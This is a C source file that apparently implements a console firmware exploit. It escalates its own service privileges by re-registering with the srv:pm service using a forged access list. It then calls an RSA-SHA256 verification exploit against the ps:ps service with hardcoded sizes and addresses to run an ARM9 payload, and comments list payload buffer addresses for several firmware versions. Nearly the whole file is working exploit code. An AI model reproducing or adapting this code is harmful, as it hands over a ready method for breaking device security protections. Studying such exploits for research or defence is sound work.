#include "exploit.h"
#include "rsa_exploit.h"
#include "svc.h"
#include "srv.h"
#include "srvpm.h"
#include "result.h"
#include "os.h"

static inline void assertSuccess(Result res)
{
    if(R_FAILED(res)) svcBreak(USERBREAK_ASSERT);
}

static void escalateServicePrivileges(Handle *wantedServiceHandle, const char *wantedServiceName)
{
    if(osGetFirmVersion() < SYSTEM_VERSION(2, 39, 4))
    {
        char accessList[][8] = {
            "01234567",
            "APT:U",
        };

        strncpy(accessList[0], wantedServiceName, 8);
        u32 pid;
        Handle srvPmHandle, srvHandle;

        assertSuccess(srvPmInit(&srvPmHandle, &srvHandle));
        assertSuccess(svcGetProcessId(&pid, CUR_PROCESS_HANDLE));
        assertSuccess(SRVPM_UnregisterProcess(&srvPmHandle, pid));
        assertSuccess(SRVPM_RegisterProcess(&srvPmHandle, pid, sizeof(accessList)/8, accessList));

        assertSuccess(srvGetServiceHandle(&srvHandle, wantedServiceHandle, wantedServiceName));
    }
    else
        svcBreak(USERBREAK_ASSERT);
}

void doExploit(void)
{
    if(osGetFirmVersion() == SYSTEM_VERSION(2, 30, 18)) // 2.1
    {
        Handle psHandle;
        escalateServicePrivileges(&psHandle, "ps:ps");
        assertSuccess(PS_VerifyRsaSha256_Exploit(&psHandle, 0xD9B8, 0x080C2340));
        // buffer size for later versions: 0x7440
        // arm9 payload buffers:
        //0x080C3EE0; //4.5
        //0x080C4420; //3.x
        //0x080C2520; //2.2
        //0x080B9620; //1.1
        //0x080B95C0; //1.0
    }
    else
        svcBreak(USERBREAK_ASSERT);
}
